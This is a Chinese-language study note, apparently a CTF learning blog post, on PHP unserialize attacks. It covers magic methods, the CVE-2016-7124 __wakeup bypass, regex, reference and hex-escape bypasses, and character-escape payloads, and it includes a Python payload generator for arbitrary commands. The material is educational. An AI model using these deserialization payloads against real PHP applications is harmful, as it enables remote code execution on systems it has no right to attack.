---
title: PHP反序列化学习
date: 2022-09-15 15:10:23
tags:
- PHP反序列化
categories:
- web
- 笔记
---

> 参考[Y4师傅博客](https://blog.csdn.net/solitudi/article/details/113588692) 

## 序列化和反序列化

## 魔术方法

```php
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
    
__construct() //创建新对象时先调用此方法
__destruct() //对象被销毁时触发
    
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
    
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
    
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
    
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
    
__set_state() //调用var_export()导出类时,  此方法会调用
```

## 绕过和利用方法

### 绕过__wakeup()(CVE-2016-7124)

> 版本限制
>
> PHP5 < 5.6.25
>
> PHP7 < 7.0.10

利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过`__wakeup`的执行

```php
class test{
    public $code;
    public function __wakeup(){
        $this->code='phpinfo();';
    }
    public function  __destruct(){
        eval($this->code)
    }
}
```

```
O:4:"test":1:{s:4:"code";s:15:"system('calc');";} -> phpinfo()

O:4:"test":2:{s:4:"code";s:15:"system('calc');";} -> system('calc')
```

### ‘O’正则绕过

```php
class backdoor{
    public $name;
    public function __destruct(){
        eval($this->name);
    }
}
$data = $_POST['data'];

if (preg_match('/^O:\d+/i',$data)){
    die("object not allow unserialize");
}
unserialize($data);
```

**方法1：+号绕过(url编码%2B)**

```
O:+8:"backdoor":1:{s:4:"name";s:13:"system('ls');";}
```

**方法2：数组绕过**

```php
$a = new backdoor();
$a->name="phpinfo()";
$b = serialize(array($a));
unserialize($b);
# a:1:{i:0;O:8:"backdoor":1:{s:4:"name";s:10:"phpinfo();";}}
```

### 引用绕过

```php
class login{
    public $password;
    public $secret;
    public function check_login(){
        if($this->password==$this->secret){
            echo "got flag";
        }
    }
}
```

```php
$a = new login();
$a->password=&$a->secret;
echo serialize($a);
//O:5:"login":2:{s:8:"password";N;s:6:"secret";R:2;}
```

上面这个例子让password指向secret的引用，两个引用相同的变量自然相等。

### 16进制绕过

```php
class test{
    public $username;
    public function __construct(){
        $this->username = 'admin';
    }
    public function  __destruct(){
        echo 666;
    }
}
function check($data){
    if(stristr($data, 'username')!==False){
        echo("你绕不过！！".PHP_EOL);
    }
    else{
        return $data;
    }
}
```

```php
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
```

```php
// \75是u的16进制
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

### 异常绕过

```php
class backdoor{
    public function __destruct(){
        echo "got flag";
    }
}
$data = $_POST['data'];
if(unserialize($data)){
    throw new Exception("not allow unserialize");
}
```

这里抛出异常不会对反序列化有影响, 正常操作即可

### 字符逃逸

#### 情况1：过滤后字符变多

```php
class backdoor{
    public $m;
    public function __construct($m){
        $this->m= $m;
        $this->a= "whoami";
    }
    public function __destruct(){
        system($this->a);
    }
}
function filter($str){
    return str_replace("system","ctfshow",$str);
}

$m = $_POST['m'];
$b = new backdoor($m);
$c = filter(serialize($b));
unserialize($c);
```

+ $m=“system”

`O:8:"backdoor":2:{s:1:"m";s:6:"ctfshow";s:1:"a";s:6:"whoami";}`

可以看见 ctfshow有7个字符 但是只会生效6个 逃逸了1字符

- 所以我们只要添加足够多的`system`前缀, 就可以自己写后续的序列化内容

- 现在我们想写入命令到a中,即要添加`s:1:"a";s:6:"whoami";` 共21个字符,  加上前面ctfshow要闭合`";` 后面要加`;}` 所以共要逃逸25个字符。最终paylod就是

  ```
  systemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystem";s:1:"a";s:6:"whoami";}
  ```

  写个脚本方便生成payload

  ```python
  cmd = input("你要执行的命令是:")
  back = f'";s:1:"a";s:{len(cmd)}:"{cmd}";}}'
  payload = "system"*len(back)+back
  print(payload)
  ```

  ```bash
  > 你要执行的命令是:ls /
  
  systemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystem";s:1:"a";s:4:"ls /";}
  ```

#### 情况2：过滤后字符变少

思路同上，一样逃逸字符后拼接

### phar反序列化

